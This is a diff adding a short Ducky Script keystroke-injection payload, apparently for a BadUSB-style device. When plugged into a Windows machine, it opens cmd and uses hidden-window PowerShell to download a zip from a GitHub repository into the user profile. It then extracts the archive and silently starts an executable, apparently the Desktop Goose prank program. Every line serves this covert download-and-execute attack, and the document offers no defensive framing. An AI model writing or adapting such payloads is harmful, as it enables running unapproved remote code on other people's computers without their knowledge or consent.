@@ -1,0 +1,26 @@
+DELAY 100
+GUI r
+DELAY 250
+STRING cmd
+ENTER
+DELAY 250
+
+STRING powershell -WindowStyle Hidden (New-Object System.Net.WebClient).DownloadFile('https://github.com/WinkyTy/Go0se/archive/refs/heads/main.zip', '%USERPROFILE%\Go0se.zip')
+ENTER
+DELAY 5000
+
+STRING powershell -WindowStyle Hidden Expand-Archive -Path '%USERPROFILE%\Go0se.zip' -DestinationPath '%USERPROFILE%\Go0se'
+ENTER
+DELAY 5000
+
+STRING cd %USERPROFILE%\Go0se\Go0se-main\DesktopGoose v0.31
+ENTER
+DELAY 500
+
+STRING start /b .\GooseDesktop.exe
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
+DELAY 100
